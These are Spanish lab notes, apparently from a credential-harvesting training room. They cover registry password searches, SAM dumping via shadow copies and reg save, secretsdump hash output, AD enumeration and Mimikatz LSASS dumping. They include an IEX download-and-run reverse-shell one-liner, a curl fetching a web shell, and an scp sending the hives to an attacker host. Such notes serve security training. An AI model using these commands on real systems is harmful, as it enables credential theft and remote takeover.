
Machine IP: MACHINE_IP            Username: thm         Password: Passw0rd!


rdesktop -u thm -p Passw0rd! <IP_o_dominio>


xfreerdp /dynamic-resolution +clipboard /cert:ignore /u:thm /p:Passw0rd! /v:10.201.111.64 

## Como ejemplo de un comando de historial, un comando de PowerShell guarda los comandos ejecutados en un archivo de historial en un perfil de usuario, en la siguiente ruta: 

```bash
C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```



se usan en Windows para buscar (query) dentro del registro (registry) claves o valores relacionados con la palabra "password", específicamente del tipo REG_SZ, en forma recursiva.

Qué hace cada parte del comando

reg query: es una herramienta de la línea de comandos de Windows para consultar (y buscar dentro de) el Registro 
learn.microsoft.com
.

HKLM (HKEY_LOCAL_MACHINE) o HKCU (HKEY_CURRENT_USER): define la rama del registro en la que se realizará la búsqueda, ya sea en todo el sistema (HKLM) o solo para el usuario actual (HKCU).

/f password: busca cualquier entrada que contenga la cadena "password" (no distingue mayúsculas por defecto; es una coincidencia parcial) 
learn.microsoft.com
.

/t REG_SZ: especifica que solo se busquen valores de tipo REG_SZ, que es texto simple.

/s: hace que la búsqueda sea recursiva, incluyendo todas las subclaves dentro de la rama especificada 


##  reg query que mencionas se utiliza para buscar contraseñas almacenadas en el registro de Windows (Registry). Es una técnica común en auditorías de seguridad o pruebas de penetración para encontrar credenciales guardadas de forma insegura. 


- reg query: Consulta el registro de Windows.
- HKLM o HKCU:
- HKLM (HKEY_LOCAL_MACHINE): Contiene configuraciones globales del sistema.
- HKCU (HKEY_CURRENT_USER): Contiene configuraciones específicas del usuario actual.
- /f password: Busca la cadena "password" (no distingue mayúsculas/minúsculas).
- /t REG_SZ: Filtra solo valores de tipo cadena (REG_SZ).
- /s: Realiza una búsqueda recursiva en todas las subclaves.



c:\Users\user> reg query HKLM /f password /t REG_SZ /s

 #OR

C:\Users\user> reg query HKCU /f password /t REG_SZ /s




a) Buscar en HKEY_LOCAL_MACHINE (HKLM)

reg query HKLM /f "flag" /t REG_SZ /s


    HKLM: Clave del registro que almacena configuraciones globales del sistema.

    /f "flag": Busca la cadena exacta "flag" (no distingue mayúsculas/minúsculas).

    /t REG_SZ: Filtra solo valores de tipo cadena (texto).

    /s: Búsqueda recursiva en todas las subclaves.

b) Buscar en HKEY_CURRENT_USER (HKCU)
cmd
reg query HKCU /f "flag" /t REG_SZ /s





reg query HKLM /f "flag" /t REG_SZ /s


password:  7tyh4ckm3



HKEY_LOCAL_MACHINE\SYSTEM\DriverDatabase\DriverPackages\ehstorpwddrv.inf_amd64_fb92106dd2773d21\Strings
    devicename    REG_SZ    Microsoft supported IEEE 1667 password silo

HKEY_LOCAL_MACHINE\SYSTEM\THM
    flag    REG_SZ    password: 7tyh4ckm3



---


# Administrador de Cuentas de Seguridad (SAM)

El SAM es una base de datos de Microsoft Windows que contiene información de cuentas locales, como nombres de usuario y contraseñas. La base de datos SAM almacena estos datos en formato cifrado para dificultar su recuperación. Además, ningún usuario puede leerla ni acceder a ella mientras el sistema operativo Windows esté en ejecución. Sin embargo, existen diversas formas y ataques para volcar el contenido de la base de datos SAM.

Primero, asegúrese de haber implementado la máquina virtual proporcionada y, a continuación, confirme que no podemos copiar ni leer el archivo c:\Windows\System32\config\sam.



cd C:\Windows\system32

type c:\Windows\System32\config\sam
    Access is denied.



copy c:\Windows\System32\config\sam C:\Users\Administrator\Desktop\ 

    The process cannot access the file because it is being used by another process.

# HashDump de Metasploit

El primer método consiste en usar hashdump, la función integrada de Metasploit Framework, para obtener una copia del contenido de la base de datos SAM. Metasploit Framework utiliza la inyección de código en memoria en el proceso LSASS.exe para volcar los hashes de copia. Para más información sobre hashdump, visite el blog de rapid7. En otra tarea, abordaremos el volcado de credenciales directamente desde el proceso LSASS.exe.





https://github.com/antonioCoco/RoguePotato/releases/tag/1.0
https://github.com/k4sth4/Rogue-Potato/blob/main/RoguePotato.exe




https://medium.com/@redfanatic7/how-to-use-psexec-complete-guide-3a047fec3a40



---

# Enumerar Usuarios y Verificar Descripciones
En AD, a veces las contraseñas se guardan accidentalmente en el campo description (descripción).
Puedes enumerarlo con estos métodos:

net user /domain




# Método 2: Con PowerShell (Más detallado)
powershell
Get-ADUser -Filter * -Properties Description | Where-Object { $_.Description -ne $null } | Format-Table Name,Description
Filtra usuarios con descripciones no vacías.

Si hay un usuario llamado "victim", revisa su descripción.

# Método 3: Búsqueda Directa de Contraseñas
powershell

Get-ADUser -Filter {Description -like "*password*"} -Properties * | Select-Object DistinguishedName, SamAccountName, Description



Import-Module ActiveDirectory
Get-ADUser -Filter * -Properties * | Select-Object DistinguishedName, SamAccountName, Description





Obenert el HASH NTLM

# usaremos wmic para crear una instantánea de volumen.
 cd

privilege::debug
token::elevate
lsadump::sam



wmic shadowcopy call create Volume='C:\'



IEX(New-Object Net.WebClient).DownloadString('http://10.8.163.249:8000/shell.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 10.8.163.249:8000 -Port 4444



curl -u http://10.8.163.249:8000/shell.php -o C:\xampp\htdocs\shell.php 




wmic shadowcopy call create Volume='C:\'

    Executing (Win32_ShadowCopy)->create()
    Method execution successful.
    Out Parameters:
    instance of __PARAMETERS
    {
        ReturnValue = 0;
        ShadowID = "{D8A11619-474F-40AE-A5A0-C2FAA1D78B85}";
    };


vssadmin list shadows



copy \\?GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam

        1 file(s) copied.



copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
        1 file(s) copied.






reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg


reg save HKLM\system C:\users\Administrator\Desktop\system-reg


scp * kali@10.8.163.249:/home/kali/.


└─$ impacket-secretsdump -sam sam-reg -system system-reg LOCAL  
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3a787a80d08385cea7fb4aa2a4261:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up... 
                                                                                                                                                 
┌──(kali㉿kali)-[~/Downloads/CredentialsHarvesting]
└─$ 








smb://10.201.111.64/SYSVOL/
smb://10.201.111.64/NETLOGON/


















cd C:\Tools\Mimikatz\mimikatz.exe
!+
!processprotect /process:lsass.exe /remove
privilege::debug
sekurlsa::logonpasswords